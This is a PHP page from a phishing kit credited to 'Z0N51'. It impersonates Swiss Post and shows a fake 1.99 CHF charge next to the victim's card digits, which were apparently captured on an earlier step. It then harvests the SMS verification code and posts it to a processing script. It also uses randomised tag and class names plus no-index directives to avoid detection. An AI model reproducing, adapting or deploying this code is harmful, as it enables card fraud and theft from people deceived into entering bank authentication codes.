<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "sms";
    $semantic = semantic();
    $cc = substr($_SESSION['one'], -4);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Detailed Tracking</title>
    </head>

    <body>

		<<?php echo $semantic; ?> id="<?php echo rr(); ?>ssarea<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>ssbox<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?> d-flex align-items-center">
                    <<?php echo $semantic; ?> class="flex-grow-1"><img src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?>><img src="../media/imgs/vs.png"></<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
                <h3><?php echo get_text('sms_title'); ?></h3>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>details<?php echo rr(); ?>">
                    <p><?php echo get_text('sms_message'); ?></p>
                    <table>
                        <tr>
                            <td><?php echo get_text('merchant'); ?>:</td>
                            <td>SWISS POST</td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('amount'); ?>:</td>
                            <td>1.99CHF</td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('date'); ?>:</td>
                            <td><?php echo date('d/m/Y'); ?></td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('card_number'); ?>:</td>
                            <td>XXXX XXXX XXXX <?php echo $cc; ?></td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('sms_code_label'); ?>:</td>
                            <td>
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="sms">
                                <input type="hidden" name="error" id="error" value="<?php echo $_GET['error']; ?>">
                                <input type="text" inputmode="numeric" maxlength="8" name="sms_code" id="sms_code" class="<?php echo errclass($_SESSION['errors'],'sms_code') ?>">
                                <?php echo errmsg($_SESSION['errors'],'sms_code'); ?>
                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;"><?php echo get_text('verify'); ?> : <span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>btns<?php echo rr(); ?>">
                    <<?php echo $semantic; ?> id="booom" class="<?php echo rr(); ?>btttn<?php echo rr(); ?>"><?php echo get_text('confirm'); ?></<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
                <p class="<?php echo rr(); ?>copy<?php echo rr(); ?>"><?php echo get_text('copyright'); ?></p>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/countdown.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('.lang p').click(function(){
                $('.lang ul').slideToggle();
            });
            var try_again = "<?php echo get_text('try_again'); ?>";
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html(try_again);
            }
            $('.timer').click(function(){
                location.reload();
            });
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'sms_code' : $('#sms_code').val(),
                    'error' : $('#error').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>